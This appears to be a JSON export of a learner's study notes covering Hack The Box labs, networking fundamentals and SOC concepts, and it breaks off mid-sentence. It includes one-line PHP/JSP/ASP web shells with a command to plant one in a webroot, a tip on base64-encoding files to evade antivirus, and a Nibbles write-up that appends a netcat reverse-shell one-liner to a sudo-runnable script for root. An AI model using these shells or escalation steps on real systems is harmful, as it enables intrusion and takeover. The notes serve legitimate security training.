guest\nsmbclient \\\\\\\\1.1.1.1\\\\users\n2. Connect as a specific user\nsmbclient -U Bob \\\\\\\\1.1.1.1\\\\users\nCommands\n\nGet: To download files to our local system\nExit: To exit ftp session.\nls: To list dir\n"},"HTB/Transferring-Files":{"title":"Transferring Files","links":["tags/file-transfer","cURL"],"tags":["file-transfer"],"content":"file-transfer\n1. Using wget or cURL\nFirst we have to start a python server on directory containing the file we need to upload\npython3 -m http.server 8000\nThen we can use wget or curl to download the file from victim system\nwget http://&lt;our_ip&gt;:8000/&lt;file_name&gt;\ncurl http://&lt;our_ip&gt;:8000/&lt;file_name&gt; -o &lt;output_file_name&gt;\n2. Using scp\nIf we have obtained ssh user credentials on the remote host. We can do so as follows:\nscp &lt;our_filename&gt; user@remotehost:/dir/&lt;out_filename&gt;\n3. Using Base64\nTo bypass firewall and av we can encode our file before sending and decode on victim system.\nFor example, if we wanted to transfer a binary file called shell, we can base64 encode it as follows:\nbase64 shell -w 0\nNow, we can copy this base64 string, go to the remote host, and use base64 -d to decode it, and pipe the output into a file:\necho &lt;encoded_string&gt; | base64 -d &gt; shell"},"HTB/User-Creation":{"title":"User Creation","links":["tags/windows","HTB/Security-Group"],"tags":["windows"],"content":"tags: windows\nCreate a new user\nNew-LocalUser -Name &#039;Bob&#039; -NoPassword\nAssign user to a Security Group\nAdd-LocalGroupMember -Name Group1 -Member Bob"},"HTB/Web-Shell":{"title":"Web Shell","links":["HTB/Webroot","cURL"],"tags":[],"content":"A Web Shell is typically a web script, i.e., PHP or ASPX, that accepts our command through HTTP request parameters such as GET or POST request parameters, executes our command, and prints its output back on the web page.\nWriting a Web Shell\nWe need to write our web shell that would take our command through a GET request, execute it, and print its output back.\nSome common web shells:\nFor php\n&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;\nFor jsp\n&lt;% Runtime.getRuntime().exec(request.getParameter(&quot;cmd&quot;)); %&gt;\nFor asp\n&lt;% eval request(&quot;cmd&quot;) %&gt;\nUploading a web shell\nWe need to have our web shell in the remote server’s Webroot to execute it. We can either upload our shell such as shell.php to the server using file upload vulnerability or directly write our shell using command execution vulnerability\nWriting a web shell\nFor apache Webroot\necho &#039;&lt;?php system($_REQUEST[&quot;cmd&quot;]); ?&gt;&#039; &gt; /var/www/html/shell.php\nAccessing Web shell\n1. Visiting the webpage\nTo run a command we can visit our shell.php page and use ?cmd=id to execute id command.\nExample url: http://SERVER_IP:PORT/shell.php\n2. Using cURL\ncurl http://SERVER_IP:PORT/shell.php\nGreatness of Web Shell\n\nIt can bypass any firewall (uploading shell might trigger tho) as we are using existing port to run command using existing service to summon a shell.\nEven if host is rebooted the shell is intact.\n\nSadness of Web Shell\n\nIts easy to detect as any sane person/antivirus can notice a shell.php in root directory.\nIts is not interactive as we need to send requests for command each time tho we can automate and make it semi automatic but its not as good.\n"},"HTB/Webroot":{"title":"Webroot","links":[],"tags":[],"content":"The following are the default webroots for common web servers:\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nWeb ServerDefault WebrootApache/var/www/html/Nginx/usr/local/nginx/html/IISc:\\inetpub\\wwwroot\\XAMPPC:\\xampp\\htdocs\\"},"HTB/Wordlists":{"title":"Wordlists","links":["HTB/Seclist"],"tags":[],"content":"Default Wordlist\nDirectory: /usr/share/wordlist\nTree\nExternal List\n1. Seclist"},"HTB/http-codes":{"title":"http codes","links":[],"tags":[],"content":"1. 200 – Successful\n\nMeaning: The request was successful, and the server returned the requested resource.\nCommon Use Cases:\n\nSuccessful loading of a web page.\nAPI request returning valid data.\n\n\n\n\n2. 301 – Redirect\n\nMeaning: The requested resource has been permanently moved to a new URL.\nCommon Use Cases:\n\nUsed in SEO to redirect old URLs to new ones.\nEnsures users and search engines access the correct location.\n\n\n\n\n3. 403 – Forbidden\n\nMeaning: The server understood the request but refuses to authorize it.\nCommon Use Cases:\n\nUser tries to access a restricted file or directory.\nMissing permissions or access credentials.\n\n\n\n\n4. 404 – Not Found\n\nMeaning: The requested resource could not be found on the server.\nCommon Use Cases:\n\nBroken links or deleted resources.\nMistyped URLs.\n\n\n\n\n5. 500 – Internal Server Error\n\nMeaning: The server encountered an error and could not complete the request.\nCommon Use Cases:\n\nServer misconfiguration or malfunction.\nBug in server-side code.\n\n\n\n\n6. 302 – Found (Temporary Redirect)\n\nMeaning: The requested resource is temporarily located at a different URL.\nCommon Use Cases:\n\nRedirecting users to a different page temporarily during maintenance.\n\n\n\n\n7. 400 – Bad Request\n\nMeaning: The server could not understand the request due to invalid syntax.\nCommon Use Cases:\n\nAPI call with incorrect parameters or malformed JSON.\n\n\n\n\n8. 401 – Unauthorized\n\nMeaning: The request requires user authentication.\nCommon Use Cases:\n\nAccessing pages or APIs requiring login credentials.\n\n\n\n\n9. 502 – Bad Gateway\n\nMeaning: The server, acting as a gateway or proxy, received an invalid response from an upstream server.\nCommon Use Cases:\n\nServer overload or upstream server issues.\n\n\n\n\n10. 503 – Service Unavailable\n\nMeaning: The server is temporarily unable to handle the request.\nCommon Use Cases:\n\nServer maintenance or high traffic.\n\n\n"},"HTB/ssh":{"title":"ssh","links":[],"tags":[],"content":"Secure shell"},"Machines/EscapeTwo":{"title":"EscapeTwo","links":[],"tags":[],"content":"Machine Info:\n- Easy\n- Windows\n- IP: 10.129.240.7\n- Incomplete\n\nSteps\n1. Reconnainsce\nNmap Scan\nCommand\nnmap -sV -oA EasyTwo-nmap 10.129.240.7 --open\nResult\nPORT     STATE SERVICE               VERSION\n53/tcp   open  domain                Simple DNS Plus\n88/tcp   open  kerberos-sec          Microsoft Windows Kerberos (server time: 2025-01-12 08:20:02Z)\n135/tcp  open  msrpc                 Microsoft Windows RPC\n139/tcp  open  netbios-ssn           Microsoft Windows netbios-ssn\n445/tcp  open  microsoft-ds?\n464/tcp  open  kpasswd5?\n593/tcp  open  ncacn_http            Microsoft Windows RPC over HTTP 1.0\n636/tcp  open  ssl/ldap              Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)\n1433/tcp open  ms-sql-s              Microsoft SQL Server 2019 15.00.2000\n3269/tcp open  ssl/globalcatLDAPssl?\nService Info: Host: DC01; OS: Windows; CPE: cpe:/o:microsoft:windows"},"Machines/Nibbles":{"title":"Nibbles","links":["'app.hackthebox.com'","HTB/Nmap","HTB/ssh","HTB/Banner-grabbing","HTB/Gobuster","HTB/Metasploit","HTB/Reverse-Shell"],"tags":[],"content":"This is a retired machine, part of Getting Started Module of Hack The Box\nSteps Taken\nReconnaissance\nNmap Scan\nCommand\nnmap -sV -oA 01-04-2025-11-44-Nibbles-nmap 10.129.207.130 --open\nResult\nPORT   STATE SERVICE VERSION\n22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)\n80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))\nService Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel\n \nConclusion\nThe host is running a apache server and is hosting a website and also has a ssh enabled and listening.\nBanner grabbing\nNo fruitful result obtained, got the same header as in nmap scan.\nVisiting the webpage\nThere is an interesting comment\n&lt;!--- /nibbleblog/ directory. Nothing interesting here! ---&gt;\nThere is nothing else on the webpage.\nGoing to the /nibbleblog directory\nThe website seems to be hosting a blog. We can note:\n\nThe blog seems to be ran using nibbleblog.\nThe website is using php.\nNothing else is there on the site\n\nEnumerating directories\nSince nothing much of our interest can be found I will enumerate directories using Gobuster. Couldn’t find anything with common.txt so using few other dictionaries to scan.\nMistake: Was enumerating the root url when I was supposed to enumerate the /nibbleblog. Found out after trying few wordlists and not finding any directories.\nCommand\ngobuster dir -u 10.129.207.130/nibbleblog -w /usr/share/wordlists/dirb/common.txt\nOutput\n===============================================================\nStarting gobuster in directory enumeration mode\n===============================================================\n/.hta                 (Status: 403) [Size: 304]\n/.htaccess            (Status: 403) [Size: 309]\n/.htpasswd            (Status: 403) [Size: 309]\n/admin                (Status: 301) [Size: 327] [--&gt; http://10.129.207.130/nibbleblog/admin/]\n/admin.php            (Status: 200) [Size: 1401]\n/content              (Status: 301) [Size: 329] [--&gt; http://10.129.207.130/nibbleblog/content/]\n/index.php            (Status: 200) [Size: 2987]\n/languages            (Status: 301) [Size: 331] [--&gt; http://10.129.207.130/nibbleblog/languages/]\n/plugins              (Status: 301) [Size: 329] [--&gt; http://10.129.207.130/nibbleblog/plugins/]\n/README               (Status: 200) [Size: 4628]\nConclusion\nWe can see few directories:\n\n/admin.php\nAppears to be login page. Tried few login combo but immediately got blacklisted. Can’t bruteforce\n/admin\nContains file system with codes mostly .php and .bit. Couldn’t find anything useful.\n/content\nJackpot! Contains /private /public and /tmp folders. Looking into /private, it has lost of files including a users.xml file which showed that admin user existed and 2 blacklisted ips.\nOther directories had nothing useful to be found.\nSo far, we only know:\nadmin user exists but can’t login cuz blacklisted,\nWebsite uses nibbleblog.\n\nLooking for nibbleblog vulnerability\nA google search later, I found that nibbleblog has a severe file upload vulnerability. We can use Metasploit to take advantage of this vulnerability and summon a Reverse Shell. We need username and password for this vulnerability.\nDeadend: The vulnerability requires a user login creds. We have run out of reconnaissance. Lets go back and make sure nothing is left out. Rechecking the exposed files in /content, the word nibbles was repeated, in &lt;name&gt; tag and more importantly in email as admin@nibbles.com, on guessing nibbles as password, and we were successfully in. Now we could use the vulnerability.\nContinuing we successfully connect a Reverse Shell to the target. We can read the user.txt now.\nPrevilege Escalation\nHas no sudo,wget,curl. The answer has to be in the personal.zip file. Has no unzipcommand as well. Found out that I was using Metasploit’s meterpreter and it wasn’t actually the shell. So I had to run shell command to get to shell which wasn’t even tty shell. Now, the real deal was personal.zip file indeed. After unzipping it, I found that it had a backup script which the user could run as sudo. Then it was matter of appending it with a reverse shell. The shell was run as root which gave us root access.\necho &#039;rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 10.10.14.18 8443 &gt;/tmp/f&#039; | tee -a monitor.sh\nThe first part is reverse shell, then tee -a to append it to monitor.sh which we can run as sudo."},"Networking/ARP":{"title":"ARP","links":["Networking/Mac-Address","Networking/IP-Address","Networking/Port"],"tags":[],"content":"Address Resolution Protocol (ARP) is used to get Mac Address of a host from using its IP Address.\nHow ARP Works\nWhen a host needs to find Mac Address of destination device in same network, following steps are followed by the host.\n1. ARP REQUEST\nAn Ethernet Broadcast is sent by the host with the IP Address of destination device.\nNote:\n\nRouters do not forward broadcasts.\nEthernet broadcast are frames with their destination address FF:FF:FF:FF:FF:FF or FFFF.FFFF.FFFF.\nSwitches flood broadcasts to all ports except the incoming Port.\n\n2. ARP REPLY\nThe host with the matching IP Address sends its Mac Address back to the original sending host.\n3. ARP Table\nWhen the sending host receives the message, it stores the Mac Address and IP Address information in a table called an ARP table."},"Networking/Bandwidth-vs-Throughput":{"title":"Bandwidth vs Throughput","links":[],"tags":[],"content":"Bandwidth\nIt is the total capacity of a network to transfer data over an interval of time. It is measured in kbps, mbps, gbps.\nThroughput\nIt is also the capacity of network to transfer data but also considers latency and other factors.\nIt means bandwidth is how much it can transfer and throughput is how much it is able to transfer with a time interval due to factors such as latency and data loss."},"Networking/DHCP":{"title":"DHCP","links":["IP-address","Networking/IP-Address","Networking/IPV4-Address","Networking/Gateway","Networking/Mac-Address"],"tags":[],"content":"Dynamic Host Configuration Protocol (DHCP) is a protocol to dynamically assign IP address to a host is generally the preferred method of assigning IPv4 addresses to hosts on large networks because it reduces the burden on network support staff and virtually eliminates entry errors.\nHow DHCP works?\n1. DHCP Discover\nNew clients send DHCP broadcast when they join the network.\n2. DHCP Offer\nThe broadcast is then received by the DHCP Server and an DHCP offer is sent back to client which contains\n\nIP Address\nSubnet Mask\nDefault Gateway address\n\n3. DHCP Request\nThe client then again sends a DHCP request packet that it will accept the address.\n4. DHCP Acknowledgement\nThe server finally sends back a DHCP packet stating that the IP address assignment has been  associated with the Mac Address of the host in its table.\nDHCP Server\nDHCP Servers can be any system running DHCP service.\nWith most medium to large networks, the DHCP server is usually a local dedicated PC-based server.\nBut for home networks, the router acts as both DHCP client and a server. The router receives the public IP Address from the ISP as DHCP client, and in its role as a DHCP server, it distributes private addresses to internal hosts."},"Networking/DNS":{"title":"DNS","links":[],"tags":[],"content":"abbr. Domain Name System\nManual Lookup\n&gt; nslookup google.com\nServer:  dns.google\nAddress:  8.8.8.8\n \nNon-authoritative answer:\nName:    google.com\nAddresses:  2404:6800:4002:826::200e\n          142.250.195.14"},"Networking/Ethernet-Protocol":{"title":"Ethernet Protocol","links":["Networking/OSI-Model","Networking/Mac-Address","Networking/Port"],"tags":[],"content":"Ethernet Frame\nEthernet frame are a part of Data Link Layer of OSI Model. Data to be transported between one NIC to other NIC in the same network is transported through the Ethernet Protocol.\nAn Ethernet Frame looks like:\n\nwhere,\n\nPreamble: It syncs the receiver NIC with the sender NIC bit by bit.\nSFD (abbr. Start Frame Delimiter): Indicates the start of actual of information related to ethernet frame.\nCRC (Frame Check Sequence): It makes sure that there was no error in received frame.\n\nEthernet Switch/ Layer 2 Switch\nEthernet switch is a device which connects multiple NICs together and is responsible to route ethernet frames from source NIC to destination NIC based on Layer 2 address. It checks for the receiving Mac Address in its Mac Address Table and forwards the frame to the Port linked with the Mac Address.\nWhen an ethernet switch receives an ethernet frame:\n\nIts checks if the source address is in the Mac Address table and if its not there adds it.\nThen checks if the destination address is there and\n\nIf founds forwards the frame to the respective Port.\nIf not found forwards the frame to all ports except the source Port.\nWhen the destination source sends frame back as source, the switch adds the address it its table then.\n\n\n"},"Networking/Gateway":{"title":"Gateway","links":["Networking/DHCP","Networking/Gateway","IP-address"],"tags":[],"content":"Gateways are the “Door” in and out of a network. In home networks, the router acts as both the DHCP Server and Gateway. Default gateway address is set when configuring the IP settings either statically or dynamically using DHCP\nFor example,\nLets say we are in a network and our IP address is 192.168.5.12 and our gateway is 192.168.5.1 (the router). Similarly, in the same physical network but on different logical network is other device 192.168.6.12, then its gateway might be 192.168.6.10, even though both of them are addressing the same router; they need different Gateway addresses because they are in different logical networks."},"Networking/IP-Address":{"title":"IP Address","links":["Networking/IPV4-Address","Networking/IPV6-Address"],"tags":[],"content":"IP Address is logical address of a computer in a computer network. IP address are used to facilitate Network Layer/Layer3 communication.\nCurrently there exist two types of IP Addresses\n\nIPV4 Address: 192.168.1.1\nIPV6 Address: fe80::7c6:ec37:1b55:6600\n\nFollowing commands can be used to view IP address of host\n\nipconfig\n"},"Networking/IPV4-Address":{"title":"IPV4 Address","links":["Networking/IPV4-Address","HTB/Services","Networking/NAT","Networking/Gateway","Networking/DHCP"],"tags":[],"content":"An IPV4 Address is used to identify each device in a network. It is a logical address of a device on a network.\n\nSubnet Mask\nThe subnet mask is used to identify the network on which the host is connected.\ne.g.,\na host with a subnet mask of 255.255.255.0 has its network address as first three octets.\nThe subnet mask for 255.255.255.0 can also be represented using slash notion or /24. This indicates that the subnet mask is 24 bits long.\n\nAddress Structure\nAn ipv4 address is 32 bits in length, and the 32 bits are grouped into four 8-bit bytes called octets like this:\n11010001.10100101.11001000.00000001\nFor ease in reading they are then converted into decimal format which we see,\n201.165.200.1\nAn ipv4 address can be divided into two portions:\n1. Network Portion\nIt is used to identify the network address of a host.\ne.g.,\na host with an IPv4 address 192.168.5.11 with a subnet mask of 255.255.255.0 has a network address as 192.168.5.0.\nTwo different hosts on different networks can’t communicate with each other, e.g., 192.168.1.5 and 192.168.2.5 can’t communicate directly and need a router to facilitate the connection.\n2. Host Portion\nIt is used to identify a host in a network.\ne.g.,\na host with an IPv4 address 192.168.5.11 with a subnet mask of 255.255.255.0 has the host address as 11.\n\nData Transmission\n1. Unicast\nUnicast transmission refers to one device sending a message to one other device in one-to-one communications.\nNote: A source IP address can only be a unicast address, because the packet can only originate from a single source. This is regardless of whether the destination IP address is a unicast, broadcast, or multicast.\n2. Broadcast\nBroadcast transmission refers to a device sending a message to all the devices on a network in one-to-all communications. By default, routers do not forward broadcasts to other networks.\nA broadcast packet has a destination IP address with all 32 one (1) bits.\nNote:\n\nIPv4 uses broadcast packets. However, there are no broadcast packets with IPv6.\nA router will not forward a broadcast, but a switch.\n\n3. Multicast\nMulticast transmission reduces traffic by allowing a host to send a single packet to a selected set of hosts that subscribe to a multicast group.\nA multicast packet is a packet with a destination IP address that is a multicast address. IPv4 has reserved the 224.0.0.0 to 239.255.255.255 addresses as a multicast range.\nThe multicast clients use Services requested by a client program to subscribe to the multicast group. Each multicast group is represented by a single IPv4 multicast destination address. When an IPv4 host subscribes to a multicast group, the host processes packets addressed to this multicast address, and packets addressed to its uniquely allocated unicast address.\n\nPrivate and Public IP Addresses\nPrivate IP Address\nPrivate IP address are used for communication within a network and can’t be used to communicate with internet.\nPrivate IP Address have the following network addresses:\n\n10.0.0.0/8\n172.16.0.0/12\n192.168.0.0/16\n\nPublic IP Address\nPublic IP address is used to communicate on the internet and is unique worldwide.\nNote: When we connect to internet, we must convert our private address to public, and this is done by home router using Network Address Translation (NAT).\n\nLoopback addresses\nLoopback addresses (127.0.0.0 /8 or 127.0.0.1 to 127.255.255.254) are more commonly identified as only 127.0.0.1. These are special addresses used by a host to direct traffic to itself.\n\nLegacy Classful Addressing\nIn early days with a limited number of computers using the internet, classful addressing was an effective means to allocate addresses. Classful address allocation was later replaced with classless addressing, which is used today. Classless addressing ignores the rules of classes (A, B, C).\nClass A\n\n(0.0.0.0/8 to 127.0.0.0/8)\nSupports extremely large networks with more than 16 million host addresses per network. Class A used a fixed /8 prefix with the first octet to indicate the network address and the remaining three octets for host addresses.\n\nClass B\n\n(128.0.0.0 /16to 191.255.0.0 /16)\nSupports moderate to large size networks with up to approximately 65,000 hosts per network. Class B used a fixed /16 prefix with the two high-order octets to indicate the network address and the remaining two octets for host addresses.\n\nClass C\n\n(192.0.0.0 /24 to 223.255.255.0 /24)\nSupport small networks with a maximum of 254 hosts per network. Class C used a fixed /24 prefix with the first three octets to indicate the network and the remaining octet for the host addresses.\n\n\nIP Assignment Techniques\n1. Static Assignment\nWith a static assignment, the network administrator must manually configure the network information for a host. At a minimum, this includes the following:\n\nIP address: This identifies the host on the network.\nSubnet Mask: This is used to identify the network on which the host is connected.\nDefault Gateway: This identifies the networking device that the host uses to access the internet or another remote network.\n\n2. Dynamic Assignment\nRather than have the network administrator assign IPv4 addresses for each workstation, it is easier to have IPv4 addresses assigned automatically. This is done using a protocol known as Dynamic Host Configuration Protocol (DHCP).\nThe benefit of DHCP is that an address is not permanently assigned to a host but is only leased for a period of time. If the host is powered down or taken off the network, the address is returned to the pool for reuse."},"Networking/IPV6-Address":{"title":"IPV6 Address","links":["Networking/IPV6-Address","Networking/IPV4-Address","Networking/NAT"],"tags":[],"content":"IPV6 Address was introduce to overcome the limitations of IPV4 Address.\nIPv6 addresses are 128 bits in length and written as a string of hexadecimal values. Every four bits are represented by a single hexadecimal digit; for a total of 32 hexadecimal values, divided into 8 parts with colon (:) every 4 digits.\ne.g., 2001 : 0db8 : 0000 : 00a3 : abcd : 0000 : 0000: 1234\nFormatting Rules\n1. Omit leading Zero\nPreferred Format: 2001 : 0db8 : 0000 : 00a3 : abcd : 0000 : 0000: 1234\nNo leading 0s: 2001 : db8 : 0 : a3 : abcd : 0 : 0 : 1234\n2. Double Colon\nContiguous segments of zeros can be represented by double colon (… : abcd : : efgh : …)\ne.g.,\n2001 : db8 : 0 : a3 : abcd : 0 : 0 : 1234 can be written as,\n2001 : db8 : 0 : a3 : abcd :: 1234\nNote: Double colon can only be used only once and its best practice it use it on the longest segments of zero.\nIPV6 Address &amp; IPV4 Address Coexistance\n1. Dual Stack\nBoth ipv4 and ipv6 coexist in this technology and is adopted mostly.\n2. Tunneling\nTunneling is a method of transporting an IPv6 packet over an IPv4 network. The IPv6 packet is encapsulated inside an IPv4 packet, similar to other types of data.\n3. Translation\nNetwork Address Translation 64 (NAT64) allows IPv6-enabled devices to communicate with IPv4-enabled devices using a translation technique similar to NAT for IPv4. An IPv6 packet is translated to an IPv4 packet and an IPv4 packet is translated to an IPv6 packet."},"Networking/Mac-Address":{"title":"Mac Address","links":["Networking/Ethernet-Protocol","Networking/IPV4-Address","Networking/ARP","ICMPv6-Neighbor-Discovery"],"tags":[],"content":"A MAC (Media Access Control) address is a unique identifier assigned to a network interface card (NIC) for use in communications within a network segment.\nMac address works at a lower level: Layer 2: Data Link (i.e. Ethernet Mac Address), than the IP Address which works at Layer 3: Network, hence it offers direct communication between NIC to NIC.\nWhen a Layer 3 IP packet is sent from a host, it is encapsulated within Layer 2 Ethernet Frame by NIC which is de-encapsulated by destination NIC. When a packet is sent outside the network:\n\nThe host sends Ethernet Frame with router’s mac address as destination\nThe router de-encapsulates the packet and finds optimal path to destination.\nThe IP packet is re-encapsulated with the next destination mac address\nThis process is continued for each network hop.\n\nHow are IP address associated with Mac address\nFor IPv4 packets, this is done through a process called Address Resolution Protocol (ARP). For IPv6 packets, the process is ICMPv6 Neighbor Discovery (ND)."},"Networking/NAT":{"title":"NAT","links":["Networking/IP-Address","Networking/NAT","Networking/IPV4-Address","Networking/DHCP"],"tags":[],"content":"NAT abbr. Network Address Translation is the process of translating a private IP Address into public IP Address and vice versa. It is done by the router when a user tries to send a packet to a host not in the network.\nThe router keeps a table of Private IP Addresses and their Public IP Addresses, and when a packet destined to Internet is sent by a host, the router uses NAT to convert it to public address by modifying the packet and forwards to the internet.\nSimilarly, when a packet reaches the router with public IP Address the router replaces the public address with private address using its table.\nIf an associated public IP Address is present in the table, the router uses DHCP to get a public IPV4 Address for the host and then adds it to table and replaces IP and finally forwards it to the Internet."},"Networking/OSI-Model":{"title":"OSI Model","links":["Networking/OSI-Model","Networking/TCP-IP-Model","Networking/TCP-IP-vs-OSI-Model"],"tags":[],"content":"Abbr: Open Systems Interconnection\n\nIt has 7 layers:\n\nPhysical Layer\nDescribes the mechanical/electrical and other means to activate, maintain and deactivate physical connection to the network.\nData Link Layer\nProvides methods for exchanging data between devices in a common media\nNetwork Layer\nServices to actually exchange data between the devices.\nIP addressing occurs at this layer.\nTransport Layer\nServices to segment, transfer, and reassemble data for individual communication between devices.\nSession Layer\nProvides services for presentation layer to manage data exchange.\nPresentation Layer\nProvides representation for data transferred between Application layer.\nApplication Layer\nControls protocol for communication between the application.\n\nOSI Model and TCP IP Model both are models to transfer data in a network but have some differences. These differences are presented in TCP IP vs OSI Model."},"Networking/Port":{"title":"Port","links":["Networking/TCP","HTB/FTP","HTB/ssh","Networking/UDP","Networking/DHCP"],"tags":[],"content":"A port is a numeric identifier within each segment that is used to keep track of specific conversations between a client and server. Ports are assigned and managed by an organization known as the Internet Corporation for Assigned Names and Numbers (ICANN). Ports are broken into three categories and range in number from 1 to 65,535:\nTypes of Ports\n1. Well-known ports\nDestination ports that are associated with common network applications are identified as well-known ports. These ports are in the range of 1 to 1023.\n2. Registered ports\nPorts 1024 through 49151 can be used as either source or destination ports. These can be used by organizations to register specific applications such as IM applications.\n3. Reserved ports\nPorts 49152 through 65535 are often used as source ports. These ports can be used by any application.\nVisual Representation\n\nSome Common Ports\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nPort NumberTransportApplication Protocol20TCPFile Transfer Protocol (FTP) - Data21TCPFTP - Control22TCPSecure Shell (ssh)23TCPTelnet25TCPSimple Mail Transfer Protocol (SMTP)53UDP, TCPDomain Name Service (DNS)67UDPDynamic Host Configuration Protocol (DHCP) - Server68UDPDHCP - Client69UDPTrivial File Transfer Protocol (TFTP)80TCPHypertext Transfer Protocol (HTTP)110TCPPost Office Protocol version 3 (POP3)143TCPInternet Message Access Protocol (IMAP)161UDPSimple Network Management Protocol (SNMP)443TCPHypertext Transfer Protocol Secure (HTTPS)"},"Networking/Socket":{"title":"Socket","links":["Networking/Port"],"tags":[],"content":"The combination of the source IP address and source Port number, or the destination IP address and destination Port number is known as a socket.\nSockets enable multiple processes, running on a client, to distinguish themselves from each other, and multiple connections to a server process to be distinguished from each other."},"Networking/TCP-IP-Model":{"title":"TCP IP Model","links":["Networking/TCP","Networking/TCP-IP-Model","Networking/OSI-Model","Networking/TCP-IP-vs-OSI-Model"],"tags":[],"content":"TCP/IP protocol is responsible for guaranteeing reliable delivery of a packet.\n\nTCP/IP protocol has 4 layers:\n\nApplication Layer\nRepresents data to the user, encoding and dialog control\nTransport Layer\nSupports communication between various devices across network\nInternet Layer\nDetermines best path through the network\nNetwork Access Layer\nControls the devices and media that make up the network\n\nThe difference between TCP IP Model and OSI Model are given in TCP IP vs OSI Model."},"Networking/TCP-IP-vs-OSI-Model":{"title":"TCP IP vs OSI Model","links":[],"tags":[],"content":"While TCP/IP and OSI both are meant to standardize communication in a network, they have some key similarities and differences.\n\nTCP/IP model does not describe general functions that are necessary for all networking communications. It describes the networking functions specific to those protocols in use in the TCP/IP protocol suite\nThe protocols that make up the TCP/IP protocol suite can be described in terms of the OSI reference model. The key similarities are in the transport and network layers; however, the two models differ in how they relate to the layers above and below each layer."},"Networking/TCP":{"title":"TCP","links":["Networking/Transport-Layer-Protocol","Networking/UDP"],"tags":[],"content":"Transmission Control Protocol (TCP) is a Transport Layer Protocol that is widely used to ensure reliable and ordered delivery of data over a network. Unlike UDP, TCP is a connection-oriented protocol that establishes a connection between the sender and receiver before data transmission.\nKey Features\n\nReliable Data Transfer: TCP ensures that all packets are delivered and in the correct order by using acknowledgments and retransmissions.\nConnection-Oriented: A connection is established and maintained until the data transfer is complete, ensuring that data is transmitted between the correct endpoints.\nFlow Control: TCP uses flow control mechanisms to prevent network congestion by adjusting the rate of data transmission based on the receiver’s ability to process data.\nError Detection and Correction: TCP includes mechanisms for error checking and correction to ensure data integrity.\nThree-Way Handshake: Connections are established using a three-way handshake (SYN, SYN-ACK, ACK) to synchronize the sender and receiver.\n\nApplications like web browsing, email, and file transfers use TCP because they require reliable and ordered delivery of data."},"Networking/Transport-Layer-Protocol":{"title":"Transport Layer Protocol","links":["Networking/OSI-Model","Networking/TCP-IP-Model","Networking/UDP","Networking/TCP"],"tags":[],"content":"Transport Layer is the 4th Layer of OSI Model and 3rd Layer of TCP IP Model. It is responsible for ensuring packets are sent reliably and any missing packets are resent.\nSome of the protocols in this layer are:\n1. UDP Protocol\n2. TCP Protocol"},"Networking/UDP":{"title":"UDP","links":["Networking/Transport-Layer-Protocol","Networking/TCP"],"tags":[],"content":"User Datagram Protocol (UDP) is a Transport Layer Protocol which is used transferring data over networks.\nUDP packets each have their own header and payload. The header contains information essential for routing and delivery, including source and destination ports, length, and a checksum.\nUnlike TCP, UDP does not establish a connection before transferring data and does not guarantee reliable delivery, order, or data integrity. This makes UDP faster and more efficient for applications that can tolerate packet loss, such as live broadcasts and online gaming."},"Networking/URI,-URN-and-URL":{"title":"URI, URN and URL","links":["HTB/FTP","HTB/ssh","tags/page155"],"tags":["page155"],"content":"Web resources and web services such as RESTful APIs are identified using a Uniform Resource Identifier (URI). A URI is a string of characters that identifies a specific network resource. As shown in the figure, a URI has two specializations:\n\nUniform Resource Name (URN) - This identifies only the namespace of the resource (web page, document, image, etc.) without reference to the protocol.\nUniform Resource Locator (URL) - This defines the network location of a specific resource on the network. HTTP or HTTPS URLs are typically used with web browsers. Other protocols such as FTP, SFTP, ssh, and others can be used as a URL. A URL using SFTP might look like: sftp://sftp.example.com.\n\nParts of URI\nThese are the parts of a URI, as shown in the figure:\n\nProtocol/scheme - HTTPS or other protocols such as FTP, SFTP, mailto, and NNTP\nHostname - w​ww.example.com\nPath and file name - /author/book.html\nFragment - page155\n\n"},"SOC-Level-1/Adversary's-Objectives":{"title":"Adversary's Objectives","links":["SOC-Level-1/Unified-Kill-Chain","SOC-Level-1/C2"],"tags":[],"content":"The ultimate goal of adversary usually boils down to one pr multiple of the three:\n\nsteal data\ndestroy the organization\nmake an impact\n\nThe Unified Kill Chain describes these motives in three steps:\nCollection\nMITRE Tactic (TA0009)\nAfter all the hunting for access and assets, the adversary will be seeking to gather all the valuable data of interest. This, in turn, compromises the confidentiality of the data and would lead to the next attack stage – Exfiltration. The main target sources include drives, browsers, audio, video and email.\nExfiltration\n(MITRE Tactic TA0010)\nTo elevate their compromise, the adversary would seek to steal data, which would be packaged using encryption measures and compression to avoid any detection. The C2 channel and tunnel deployed in the earlier phases will come in handy during this process.\nImpact\n(MITRE Tactic TA0040)\nIf the adversary seeks to compromise the integrity and availability of the data assets, they would manipulate, interrupt or destroy these assets. The goal would be to disrupt business and operational processes and may involve removing account access, disk wipes, and data encryption such as ransomware, defacement and denial of service (DoS) attacks.\nThe adversary may also wipe out the victim system in this stage to remove any traces of him."},"SOC-Level-1/Backdoor":{"title":"Backdoor","links":["SOC-Level-1/Pyramid-of-Pain","HTB/Remote-Shells","HTB/Services"],"tags":[],"content":"Maintaining access is important for adversaries, but it is very difficult. The longer a system has been compromised, greater are the risks of detection, and once detected the vulnerabilities will be patched and the cycle of pain continues. To break this cycle, adversaries usually set up a way to still remain in control even after the vulnerability is patched. This is what we call a backdoor, an alternate way in.\nTo achieve this, adversaries modify system settings or applications to receive malicious requests and execute them. There are number of backdoors a adversary can install on a system such as\n\nRemote Shells\nModified Windows Services\n"},"SOC-Level-1/C2":{"title":"C2","links":["HTB/Reverse-Shell","Networking/DNS"],"tags":[],"content":"Command and Control (C2) Infrastructure are a set of programs used to communicate with a victim machine. This is comparable to a Reverse Shell, but is generally more advanced and often communicate via common network protocols, like HTTP, HTTPS and DNS.\nCommon C2 Channels\n1. HTTP/HTTPS\nThe protocols HTTP on 